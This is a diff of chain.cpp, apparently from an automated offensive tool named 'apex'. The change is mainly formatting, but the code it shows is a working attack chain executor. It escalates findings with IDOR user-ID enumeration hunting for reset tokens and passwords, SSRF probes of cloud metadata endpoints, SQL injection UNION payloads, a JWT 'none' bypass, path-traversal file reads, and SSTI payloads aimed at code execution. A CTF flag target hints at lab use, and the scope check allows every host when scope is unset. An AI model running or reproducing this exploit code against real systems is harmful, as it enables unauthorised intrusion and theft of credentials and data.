@@ -1,26 +1,23 @@
 /// @file chain.cpp
 /// @brief Attack chain executor: escalates findings into full exploit chains.
 #include "chain.hpp"
+
 #include <iostream>
 #include <regex>
 
 namespace apex {
 
-ChainExecutor::ChainExecutor(const Config &cfg, HttpClient &http)
-    : cfg_(cfg), http_(http) {}
+ChainExecutor::ChainExecutor(const Config& cfg, HttpClient& http) : cfg_(cfg), http_(http) {}
 
-bool ChainExecutor::in_scope(const std::string &url) const {
-  if (cfg_.scope.empty())
-    return true;
-  return url.find(cfg_.scope) != std::string::npos ||
-         url.find(cfg_.target) != std::string::npos;
+bool ChainExecutor::in_scope(const std::string& url) const {
+  if (cfg_.scope.empty()) return true;
+  return url.find(cfg_.scope) != std::string::npos || url.find(cfg_.target) != std::string::npos;
 }
 
-std::vector<AttackChain>
-ChainExecutor::execute(const std::vector<Finding> &findings) {
+std::vector<AttackChain> ChainExecutor::execute(const std::vector<Finding>& findings) {
   std::vector<AttackChain> chains;
 
-  for (const auto &f : findings) {
+  for (const auto& f : findings) {
     AttackChain chain;
     if (f.type == "IDOR" || f.type == "idor")
       chain = chain_idor(f);
@@ -46,7 +43,7 @@ ChainExecutor::execute(const std::vector<Finding> &findings) {
   return chains;
 }
 
-AttackChain ChainExecutor::chain_idor(const Finding &f) {
+AttackChain ChainExecutor::chain_idor(const Finding& f) {
   AttackChain chain;
 
   // Step 1: Try user IDs 0-10 to find admin/other users
@@ -54,8 +51,7 @@ AttackChain ChainExecutor::chain_idor(const Finding &f) {
   std::string base_url = f.url;
   std::smatch match;
 
-  if (!std::regex_search(base_url, match, id_re))
-    return chain;
+  if (!std::regex_search(base_url, match, id_re)) return chain;
 
   std::string prefix = match.prefix().str();
   std::string suffix = match.suffix().str();
@@ -74,13 +70,10 @@ AttackChain ChainExecutor::chain_idor(const Finding &f) {
 
     // Look for sensitive fields in response
     if (step.success) {
-      if (resp.body.find("reset_token") != std::string::npos ||
-          resp.body.find("password") != std::string::npos ||
-          resp.body.find("secret") != std::string::npos ||
-          resp.body.find("admin") != std::string::npos) {
+      if (resp.body.find("reset_token") != std::string::npos || resp.body.find("password") != std::string::npos ||
+          resp.body.find("secret") != std::string::npos || resp.body.find("admin") != std::string::npos) {
         chain.impact = "Access to other users' sensitive data via IDOR";
-        chain.proof =
-            "User ID " + std::to_string(id) + " contains sensitive fields";
+        chain.proof = "User ID " + std::to_string(id) + " contains sensitive fields";
         chain.complete = true;
         break;
       }
@@ -91,7 +84,7 @@ AttackChain ChainExecutor::chain_idor(const Finding &f) {
   return chain;
 }
 
-AttackChain ChainExecutor::chain_ssrf(const Finding &f) {
+AttackChain ChainExecutor::chain_ssrf(const Finding& f) {
   AttackChain chain;
 
   // Step 1: Try cloud metadata endpoints
@@ -106,11 +99,9 @@ AttackChain ChainExecutor::chain_ssrf(const Finding &f) {
 
   // Extract the SSRF injection point from the finding
   std::string inject_url = f.url;
-  if (inject_url.find("url=") == std::string::npos &&
-      inject_url.find("webhook") == std::string::npos)
-    return chain;
+  if (inject_url.find("url=") == std::string::npos && inject_url.find("webhook") == std::string::npos) return chain;
 
-  for (const auto &[target, desc] : targets) {
+  for (const auto& [target, desc] : targets) {
     // Replace the URL parameter value with our target
     std::string payload_url = inject_url;
     auto pos = payload_url.find("url=");
@@ -140,13 +131,12 @@ AttackChain ChainExecutor::chain_ssrf(const Finding &f) {
   return chain;
 }
 
-AttackChain ChainExecutor::chain_sqli(const Finding &f) {
+AttackChain ChainExecutor::chain_sqli(const Finding& f) {
   AttackChain chain;
 
   // Step 1: Try UNION-based extraction
   std::string base = f.url;
-  if (f.param.empty())
-    return chain;
+  if (f.param.empty()) return chain;
 
   std::vector<std::string> payloads = {
       "' UNION SELECT NULL,NULL,NULL--",
@@ -154,7 +144,7 @@ AttackChain ChainExecutor::chain_sqli(const Finding &f) {
       "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
   };
 
-  for (const auto &payload : payloads) {
+  for (const auto& payload : payloads) {
     std::string url = base + "&" + f.param + "=" + payload;
     auto resp = http_.get(url);
 
@@ -162,8 +152,7 @@ AttackChain ChainExecutor::chain_sqli(const Finding &f) {
     step.action = "http_get";
     step.url = url;
     step.reason = "SQLi data extraction";
-    step.success = (resp.status_code == 200 &&
-                    resp.body.find("admin") != std::string::npos);
+    step.success = (resp.status_code == 200 && resp.body.find("admin") != std::string::npos);
     step.result = resp.body.substr(0, 200);
     chain.steps.push_back(step);
 
@@ -179,7 +168,7 @@ AttackChain ChainExecutor::chain_sqli(const Finding &f) {
   return chain;
 }
 
-AttackChain ChainExecutor::chain_jwt(const Finding &f) {
+AttackChain ChainExecutor::chain_jwt(const Finding& f) {
   AttackChain chain;
 
   // Step 1: Try 'none' algorithm bypass
@@ -199,7 +188,7 @@ AttackChain ChainExecutor::chain_jwt(const Finding &f) {
   return chain;
 }
 
-AttackChain ChainExecutor::chain_lfi(const Finding &f) {
+AttackChain ChainExecutor::chain_lfi(const Finding& f) {
   AttackChain chain;
 
   std::vector<std::pair<std::string, std::string>> targets = {
@@ -210,7 +199,7 @@ AttackChain ChainExecutor::chain_lfi(const Finding &f) {
       {"../../../tmp/flag.txt", "CTF flag"},
   };
 
-  for (const auto &[path, desc] : targets) {
+  for (const auto& [path, desc] : targets) {
     std::string url = f.url;
     // Replace the file parameter value
     auto pos = url.rfind("=");
@@ -225,8 +214,7 @@ AttackChain ChainExecutor::chain_lfi(const Finding &f) {
     step.url = url;
     step.reason = "LFI read " + desc;
     step.success = (resp.status_code == 200 && resp.body.size() > 5 &&
-                    (resp.body.find("root:") != std::string::npos ||
-                     resp.body.find("FLAG{") != std::string::npos ||
+                    (resp.body.find("root:") != std::string::npos || resp.body.find("FLAG{") != std::string::npos ||
                      resp.body.find("SECRET") != std::string::npos));
     step.result = resp.body.substr(0, 200);
     chain.steps.push_back(step);
@@ -243,7 +231,7 @@ AttackChain ChainExecutor::chain_lfi(const Finding &f) {
   return chain;
 }
 
-AttackChain ChainExecutor::chain_ssti(const Finding &f) {
+AttackChain ChainExecutor::chain_ssti(const Finding& f) {
   AttackChain chain;
 
   // Escalate from detection to RCE
@@ -253,7 +241,7 @@ AttackChain ChainExecutor::chain_ssti(const Finding &f) {
       {"{{''.__class__.__mro__[1].__subclasses__()}}", "Class enumeration"},
   };
 
-  for (const auto &[payload, desc] : payloads) {
+  for (const auto& [payload, desc] : payloads) {
     std::string url = f.url;
     auto pos = url.rfind("=");
     if (pos != std::string::npos) {
@@ -266,9 +254,8 @@ AttackChain ChainExecutor::chain_ssti(const Finding &f) {
     step.action = "http_get";
     step.url = url;
     step.reason = "SSTI escalation: " + desc;
-    step.success = (resp.status_code == 200 &&
-                    (resp.body.find("SECRET") != std::string::npos ||
-                     resp.body.find("subprocess") != std::string::npos));
+    step.success =
+        (resp.status_code == 200 && (resp.body.find("SECRET") != std::string::npos || resp.body.find("subprocess") != std::string::npos));
     step.result = resp.body.substr(0, 200);
     chain.steps.push_back(step);
 
@@ -284,4 +271,4 @@ AttackChain ChainExecutor::chain_ssti(const Finding &f) {
   return chain;
 }
 
-} // namespace apex
+}  // namespace apex
